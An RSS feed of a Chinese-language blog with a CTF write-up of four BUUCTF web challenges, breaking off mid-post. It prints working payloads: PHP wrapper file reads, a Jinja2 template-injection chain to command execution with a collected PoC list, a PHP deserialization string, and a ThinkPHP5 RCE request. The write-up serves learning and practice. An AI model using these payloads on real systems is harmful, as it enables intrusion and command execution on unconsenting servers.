<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>diao-diao-UPUP</title>
    <link>http://yoursite.com/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Fri, 08 May 2020 13:46:15 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>BUUCTF-Nepnep-0</title>
      <link>http://yoursite.com/2020/05/08/BUUCTF-Nepnep-0/</link>
      <guid>http://yoursite.com/2020/05/08/BUUCTF-Nepnep-0/</guid>
      <pubDate>Fri, 08 May 2020 04:14:29 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;这是加入Nepnep战队之后的第一次刷题记录,由于要求刷题记录5题一篇文章，所以在这里做出一个改变&lt;/p&gt;
&lt;h1 id=&quot;ACTF2020-新生赛-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Include&quot; class=&quot;headerlink&quot; ti
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>这是加入Nepnep战队之后的第一次刷题记录,由于要求刷题记录5题一篇文章，所以在这里做出一个改变</p><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>打开环境之后，发现有个链接，点击一下<br><img src="/images/Nepnep/ACTF2020新生赛Include-0.png" alt="avatar"></p><p>点击之后得到这样一个界面，发现URL上有一个file变量，可以判断是使用伪协议来进行来进行文件的读取<br>所以先常规查看一下index.php的内容<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><br>经过base64转码后得到index.php的代码：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$file</span>,<span class="string">"php://input"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"zip://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"phar://"</span>) || stristr(<span class="variable">$file</span>,<span class="string">"data:"</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line">include(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">echo <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>这段代码还是很简单的，就是利用了stristr函数来对几个常见的伪协议进行搜索，如果搜索到使用了这几个伪协议那就判断为hacker!</p><p>类似于正则，但是没有正则灵活吧</p><p>这里分析看到并没有过滤php://filter，所以直接使用读取flag.php<br>pyload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><br>得到flag,属于送分题类型</p><h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题打开之后是个google搜索，随便在框内输入，然后点击搜索后，在页面看到了我输入的内容，发现没有什么东西，查看源码之后得到了提示：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span></span><br></pre></td></tr></table></figure><br>这里不知道是什么意思，在网上搜索了之后发现是ssti注入</p><p>我这里参考了这篇文章<br><a href="https://xz.aliyun.com/t/3679#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679#toc-9</a></p><p>造成模板注入的原因与一般注入相同，都是渲染的模板可以受用户控制且过分相信了用户的输入而造成了模板注入</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>类似于这样的模板：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="template-variable">&#123;$what&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>$what会接受用户输入的值，例如用户输入xxx，那么这个模板经过渲染后就会变为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就是模板受用户控制</p><h3 id="jiajia2的基本语法"><a href="#jiajia2的基本语法" class="headerlink" title="jiajia2的基本语法"></a>jiajia2的基本语法</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;config&#125;&#125;</span>可以获取当前设置</span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="keyword">self</span>.__dict__._TemplateReference__context.config&#125;&#125;</span> 同样可以看到config</span><br><span class="line"><span class="template-variable">&#123;&#123;&#125;&#125;</span>为变量</span><br><span class="line">&#123;<span class="comment"># #&#125;为注释</span></span><br><span class="line"><span class="template-variable">&#123;% %&#125;</span>内可以写代码</span><br></pre></td></tr></table></figure><p>另外得知jiajia2貌似是基于flask框架的，所以再补充一下python的知识<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">__class__</span> 返回类型所属的对象</span><br><span class="line"><span class="strong">__subclasses__</span> 返回该对象所在类的子类</span><br><span class="line"><span class="strong">__init__</span> 类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span> 对包含函数全局变量的字典的引用</span><br><span class="line"><span class="strong">__mro__</span> 返回该对象的所有类，包括父类</span><br><span class="line"><span class="strong">__bases__</span> 返回该对象所继承的基类 <span class="strong">__builtins__</span>是做为默认初始模块</span><br></pre></td></tr></table></figure><br>根据这些，以及参考的资料，首先对其进行测试</p><h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>pyload:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/images/Nepnep/fakegoogle0.png" alt="avatar"></p><p>验证了存在ssti注入<br>首先使用()配合空字符串，加上<strong>class</strong>来查看类<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?<span class="built_in">name</span>=&#123;&#123;().<span class="variable">__class__</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到class ‘tuple’，成功之后在使用_bases_来查看继承的基类<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure><br>得到确实是所有类的父类<class 'object'></p><p>接下来选中object类，并且使用subclasses返回它的所有子类</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>列出了所有子类,这里要找的是OS所在的warnings.catch_warnings类<br>发现在170个，索引就为169<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>选中后初始化这个类,并使用globals全局查看里面的方法<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure></p><p>在这些方法中找到eval,并进行创建<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>.</span><span class="module"><span class="identifier">__builtins__</span>[</span></span>%<span class="number">27</span>eval%<span class="number">27</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><br>接下来import OS ,并执行whoami命令查看是否可以运行<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27whoami%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到了ctf，证明可以正常运行，接下来就cat /flag<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27cat%20/flag%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>成功得到了flag</p><h2 id="SSTI注入-POC收藏"><a href="#SSTI注入-POC收藏" class="headerlink" title="SSTI注入-POC收藏"></a>SSTI注入-POC收藏</h2><p>另外还在网上看到了很多POC 这里收藏一下<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第二种</span><br><span class="line">或者找到os.<span class="emphasis">_wrap_</span>close模块 117个</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;  </span><br><span class="line">当前文件夹</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br><span class="line">来打开文件，payload有很多慢慢摸索慢慢积累= =</span><br></pre></td></tr></table></figure><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三种</span><br><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">第四种</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开之后看到源码<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到需要text file和password三个参数满足条件，才会输出flag</p><p>先分析一下text参数<br>text参数先判断了是否存在，如果存在则使用file_get_contents($text,’r’)</p><p>查阅了一下百度，file_get_contents() 是把文件读入一个字符串，所以可得知，需要将welcome to the zjctf输入到文件中，然后进行查询，才能满足条件</p><p>file则是需要包含useless.php</p><p>password则是需要进行反序列化操作</p><p>所以先想到使用伪协议来将welcome to the zjctf读入到文件中，然后再使用伪协议读取useless.php的内容，猜测useless.php中的内容就是password需要的反序列化内容</p><p>这里伪协议做一个补充</p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PHP支持的伪协议"><a href="#PHP支持的伪协议" class="headerlink" title="PHP支持的伪协议"></a>PHP支持的伪协议</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><p>常用的伪协议：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>  <span class="comment"> //经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.</span></span><br><span class="line">可以跟的参数有resource=&lt;要过滤的数据流&gt;  <span class="built_in">read</span>=&lt;读链的筛选列表&gt;  <span class="built_in">write</span>=&lt;写链的筛选列表&gt;</span><br><span class="line">常用语句：php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php  <span class="built_in">read</span>/<span class="built_in">write</span>参数替换<span class="built_in">read</span>的位置即可  resource为必须的参数</span><br><span class="line"></span><br><span class="line">php://input  <span class="comment"> //php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">file</span>://   <span class="comment"> //file://伪协议在双OFF的时候也可以用，用于本地文件包含  file://协议必须是绝对路径</span></span><br><span class="line"></span><br><span class="line">phar://  <span class="comment"> //说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关  </span></span><br><span class="line">常用语句：phar://test.[zip/jpg/png…]/<span class="built_in">file</span>.txt</span><br><span class="line"></span><br><span class="line">data://<span class="keyword">text</span>/plain;base64,base编码字符串   <span class="comment"> //很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</span></span><br></pre></td></tr></table></figure></p><h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>这里有两种方法  一种是使用php://input，但是需要在POST请求下进行，比较繁琐，所以我这里采用了data协议</p><p>pyload:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure></p><p>接着看到<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>看到了include  并且提示了useless.php 所以考虑使用文件包含，用PHP://filter来读取<br>pyload:<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;<span class="built_in">base64</span>,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=useless.php</span><br></pre></td></tr></table></figure></p><p>获得了useless.php的base64 解码后得到源码为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>接下来看到password变量需要进行反序列化的一个操作<br>所以我们这里反序列化这个Flag类：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=<span class="keyword">new</span> Flag();</span><br><span class="line">$flag=serialize($flag);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>pyload:<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:"Flag":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">8</span>:"flag.php";&#125;</span><br></pre></td></tr></table></figure><br>最后F12,得到flag</p><h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>打开链接之后，并没有发现什么特别的，看到一个Powered By THINKPHP5</p><p>所以百度了一下THINKPHP5是什么东西</p><p>经过百度之后，查看到THINKPHP5是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，得知这是一个建站的框架</p><p>再加搜索 看到这一篇文章<br><a href="https://www.codercto.com/a/54587.html" target="_blank" rel="noopener">https://www.codercto.com/a/54587.html</a></p><p>得知了考察的是任意代码执行漏洞</p><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>这里的知识点就是文章中提到的THINKPHP5.X版本的RCE</p><p>原来RCE离我那么近</p><h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>使用文章中的pyload进行测试<br><img src="/images/Nepnep/[BJDCTF2nd]old-hack0.png" alt="avatar"></p><p>得到如图所示的界面，接下来pyload:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">ls</span> /</span></span><br></pre></td></tr></table></figure><br><img src="/images/Nepnep/[BJDCTF2nd]old-hack1.png" alt="avatar"></p><p>最后cat flag<br><figure 